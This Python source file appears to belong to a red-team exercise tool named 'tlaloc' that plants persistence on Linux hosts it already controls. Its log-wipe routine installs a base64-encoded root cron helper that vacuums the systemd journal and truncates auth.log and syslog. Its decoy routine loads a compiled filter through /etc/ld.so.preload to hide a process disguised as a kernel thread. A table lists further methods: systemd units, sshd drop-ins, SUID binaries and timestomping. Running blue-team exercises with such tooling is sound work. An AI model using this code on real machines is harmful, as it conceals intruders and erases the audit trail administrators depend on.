    """The earlier agent's `evasion_linux._logs`: journal vacuum + auth/syslog
    truncation on a cron — red's login trail thins while blue hunts.

    tlaloc rotates instead of wiping: the cron calls a drawn helper script which
    COPIES auth.log/syslog into a drawn directory and then truncates the live
    files. The live trail thins (the point) and the content is still on the box
    for the organizer's restore table (the rebuild's "never delete" audit
    finding).
    """
    cron = _name(names, "log_cleanup")
    helper = f"{_name(names, 'cron_marker')}.sh"
    qdir = f"{_name(names, 'cron_marker')}.bak"
    body = "\n".join([
        "#!/bin/sh",
        f"mkdir -p {qdir}",
        f"cp -a /var/log/auth.log {qdir}/auth.log.$(date +%s) 2>/dev/null || true",
        f"cp -a /var/log/syslog {qdir}/syslog.$(date +%s) 2>/dev/null || true",
        "journalctl --vacuum-time=1s >/dev/null 2>&1 || true",
        ": > /var/log/auth.log 2>/dev/null || true",
        ": > /var/log/syslog 2>/dev/null || true",
        "",
    ])
    b64 = base64.b64encode(body.encode()).decode()
    line = f"*/15 * * * * root /bin/sh {helper}"
    guard = f"[ -f {cron} ] && [ -x {helper} ]"
    create = (f"echo {b64} | base64 -d > {helper} && chmod 755 {helper} && "
              f"printf '%s\\n' '{line}' > {cron} && chmod 644 {cron} && "
              f"/bin/sh {helper}")
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("logwipe", guard, create, owned=helper), timeout=90)
    if fields is None:
        return Result(False, f"logwipe: {problem}")
    if fields["state"] == "present":
        return _present("logwipe", ip)
    if fields["state"] == "failed":
        return _failed("logwipe", "failed", ip)
    detail = (f"{cron} runs {helper} every 15 min — journal vacuum + "
              f"auth/syslog rotated into {qdir}")
    return _created(
        "logwipe", ip, detail, "persist-logwipe", [cron, helper, qdir],
        [f"mv -f {cron} {cron}{BAK}",
         f"mv -f {helper} {helper}{BAK}",
         f"cp -a {qdir}/auth.log.* /var/log/auth.log",
         f"cp -a {qdir}/syslog.* /var/log/syslog",
         f"mv -f {qdir} {qdir}{BAK}"],
        check_cmd=f"test -f {cron} && test -x {helper}")


def procfilter_so(ctx):
    """The earlier agent's `proc_hide._staged_so`: a built procfilter.so,
    compiled once from source if it is not staged (red01 has cc — the beacon
    build needed it too)."""
    directory = str((ctx.cfg.get("procfilter") or {}).get("install_dir") or "") \
        or "/opt/tlaloc/vendor/procfilter"
    if not os.path.isdir(directory):
        local = os.path.normpath(os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "..", "..",
            "vendor", "procfilter"))
        if os.path.isdir(local):
            directory = local
    so = os.path.join(directory, "procfilter.so")
    if os.path.exists(so):
        return so
    src = os.path.join(directory, "procfilter.c")
    if not os.path.exists(src):
        return None
    try:
        rc, _, _ = ctx.ssh.run_local(
            f"cc -shared -fPIC -O2 -o {_q(so)} {_q(src)} -ldl", timeout=60)
    except Exception:
        return None
    return so if rc == 0 and os.path.exists(so) else None


def _decoy(ctx, ip, fh, names):
    """The procfilter hunt-bait (the earlier agent's `proc_hide`): an
    /etc/ld.so.preload readdir filter plus a decoy sleeper whose argv is smeared
    to a kernel-thread name.

    Invisible to ps/top/ls and visible to unhide's syscall brute-force — the
    mismatch is the hunt blue is supposed to find. The artifact's `check_cmd`
    pins standing to alive AND still hidden, so a reboot or a blue
    preload-strip flips it dead for the re-plant rung. One per box: the state
    file records pid/lib/dir because the filter hides all three from a listing.

    The preload line goes in through the shared `preload_install`, so this
    family cannot skip the `LD_PRELOAD=/bin/true` load test that its own earlier
    version (and the rebuild's audit finding #4) is about.
    """
    if not (ctx.cfg.get("effects") or {}).get("decoy"):
        return Result(False, "decoy: the procfilter hunt-bait is off by default "
                             "(set effects.decoy=true to enable the optional "
                             "flavour)")
    so_src = procfilter_so(ctx)
    if so_src is None:
        return Result(False, "decoy: procfilter.so is not staged and could not "
                             "be built — run `make -C vendor/procfilter` on "
                             "red01 (needs cc)")
    lib = _name(names, "bait_lib")
    dirname = _name(names, "bait_dir")
    conf = _name(names, "bait_conf")
    pidfile = _name(names, "bait_pid")
    state = _name(names, "bait_state")
    staging = _name(names, "bait_staging")
    kthread = ctx.rng.choice(KTHREADS)
    guard = (f"test -f {state} && kill -0 $(cut -d' ' -f1 {state} 2>/dev/null) "
             f"2>/dev/null && grep -qF {lib} {LD_PRELOAD} 2>/dev/null")
    present, problem = _probe(ctx, ip, fh, guard)
    if problem:
        return Result(False, f"decoy: {problem}")
    if present:
        return _present("decoy", ip)
    try:
        ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", so_src, staging,
                         mode=0o644, key_path=fh.get("key_path"))
    except Exception as exc:
        return Result(False, f"decoy: procfilter upload failed: {exc}")
    post = [
        f"[ -f {state} ] && read _op _ol _od < {state} 2>/dev/null || _op=\"\"",
        f'if kill -0 "$_op" 2>/dev/null; then _p=$_op; else',
        f"  setsid /bin/sh -c 'echo $$ > {pidfile}; exec -a \"{kthread}\" "
        f"/bin/sh -c \"while :; do sleep 60; done\"' >/dev/null 2>&1 </dev/null &",
        f"  sleep 1; _p=$(cat {pidfile} 2>/dev/null)",
        "fi",
        f"printf '%s\\n%s\\n%s\\n' \"$_p\" {os.path.basename(lib)} "
        f"{os.path.basename(dirname)} > {conf}",
        f'if kill -0 "$_p" 2>/dev/null && test -d "/proc/$_p" && '
        f'! ls /proc 2>/dev/null | grep -qw "$_p" && '
        f"grep -qF {lib} {LD_PRELOAD}; then",
        f"  printf '%s %s %s\\n' \"$_p\" {lib} {dirname} > {state}",
        "  st=hidden",
        "else",
        "  st=miss",
        "fi",
        f'echo "TLALOC_PID $_p {lib}"',
    ]
    fields, raw, problem = preload_install(ctx, ip, fh, lib, staging=staging,
                                           post_enabled=post, timeout=120)
    if fields is None:
        return Result(False, f"decoy: {problem}")
    state_name = fields["state"]
    pid = ""
    for line in raw.splitlines():
        if line.startswith("TLALOC_PID") and len(line.split()) > 1:
            pid = line.split()[1]
    detail = (f"procfilter hunt-bait: {lib} in {LD_PRELOAD} hiding pid "
              f"{pid or '?'} (argv {kthread}); list {conf}")
    recipe = [f"grep -vF {lib} {LD_PRELOAD} > {LD_PRELOAD}{BAK} && "
              f"mv -f {LD_PRELOAD}{BAK} {LD_PRELOAD}",
              f"kill {pid or '<pid>'}",
              f"mv -f {lib} {lib}{BAK}",
              f"mv -f {conf} {conf}{BAK}",
              f"mv -f {pidfile} {pidfile}{BAK}",
              f"mv -f {state} {state}{BAK}"]
    artifact = {"ip": ip, "kind": "persist-decoy", "detail": detail,
                "check_cmd": (f"test -d /proc/{pid} && ! ls /proc 2>/dev/null "
                              f"| grep -qw {pid}") if pid else None,
                "paths": [lib, conf, state, pidfile]}
    restore = {"recipe": recipe, "secrets": None}
    if state_name == "hidden":
        ctx.world.note(ip, f"persist decoy: blue recovery = remove {lib} from "
                           f"{LD_PRELOAD}, then kill {pid or 'the decoy'} (or "
                           f"empty {conf} — the decoy reappears in ps)")
        return Result(True, f"decoy {pid} hidden on {ip} via {lib} (invisible to "
                            "ps/ls; unhide will flag it)",
                      data={"state": "hidden", "pid": pid, "kthread": kthread},
                      artifacts=[artifact], restore=restore)
    if state_name == "miss":
        # The files are on the box and the filter is enabled, but the decoy is
        # not hidden: the box changed, so record it — and report the failure.
        return Result(False, f"decoy: the plant on {ip} did not hold (the decoy "
                             "is not alive or still visible to a listing) — the "
                             "files are recorded for cleanup",
                      installed=True, data={"state": "miss", "pid": pid},
                      artifacts=[artifact], restore=restore)
    if state_name == "refused":
        return Result(
            False,
            f"decoy: the load test refused the filter (`LD_PRELOAD={lib} "
            f"/bin/true` failed) — {LD_PRELOAD} was left untouched; the staged "
            f"copy is at {staging} and {lib}{BAK} is parked",
            installed=True, data={"state": "refused"},
            artifacts=[{"ip": ip, "kind": "persist-decoy",
                        "detail": f"{detail} (load test refused)",
                        "check_cmd": None, "paths": [staging]}],
            restore={"recipe": [f"mv -f {staging} {staging}{BAK}"],
                     "secrets": None})
    return _failed("decoy", state_name, ip)


# The family table. Order matches `persist.AUTO_ORDER_LINUX`.
FAMILIES = {
    "systemd_unit": _systemd_unit,
    "profile": _profile,
    "sshd_dropin": _sshd_dropin,
    "cron": _cron,
    "cron_reaper": _cron_reaper,
    "timer": _timer,
    "user_cron": _user_cron,
    "keys": _keys,
    "suid": _suid,
    "preload": _preload,
    "immu": _immu,
    "timestomp": _timestomp,
    "logwipe": _logwipe,
    "decoy": _decoy,
}

# The drawn names each family cannot work without. persist.py always passes the
# full set; this is the guard against a caller passing half a name set (which
# would otherwise plant a broken path).
NEEDS = {
    "systemd_unit": ("unit", "unit_desc"),
    "profile": ("profile", "key_comment"),
    "sshd_dropin": ("sshd_dropin", "keys_dir", "key_comment"),
    "cron": ("cron", "cron_marker"),
    "cron_reaper": ("cron_reaper",),
    "timer": ("timer", "timer_unit", "profile"),
    "user_cron": ("cron_marker",),
    "keys": ("key_comment",),
    "suid": ("suid",),
    "preload": ("hider_dir", "hider_so", "hider_conf"),
    "immu": (),
    "timestomp": (),
    "logwipe": ("log_cleanup", "cron_marker"),
    "decoy": ("bait_lib", "bait_dir", "bait_conf", "bait_pid", "bait_state",
              "bait_staging"),
}


def apply(ctx, ip, family, names):
    """Install one family and report exactly what was planted.

    Returns a Result for every outcome: an unknown family, an incomplete name
    set, no root path, a transport blow-up and a box that refused the write are
    all ok=False with the reason. Nothing raises.
    """
    handler = FAMILIES.get(family)
    if handler is None:
        return Result(False, f"persist: unknown linux family {family!r} "
                             f"(known: {sorted(FAMILIES)})")
    names = dict(names or {})
    missing = [k for k in NEEDS.get(family, ()) if not names.get(k)]
    if missing:
        return Result(False, f"{family}: the drawn name set is incomplete "
                             f"(missing {missing})")
    fh = ctx.world.foothold(ip)
    if fh is None:
        return Result(False, f"{family}: no foothold on {ip}")
    if fh.get("windows"):
        return Result(False, f"{family}: {ip} is Windows — use persist_windows")
    if not can_root(fh):
        return Result(False, f"{family}: no root path on {ip} — escalate first")
    try:
        return handler(ctx, ip, fh, names)
    except Exception as exc:              # transport/box weirdness, per family
        return Result(False, f"{family}: {type(exc).__name__}: {exc}")
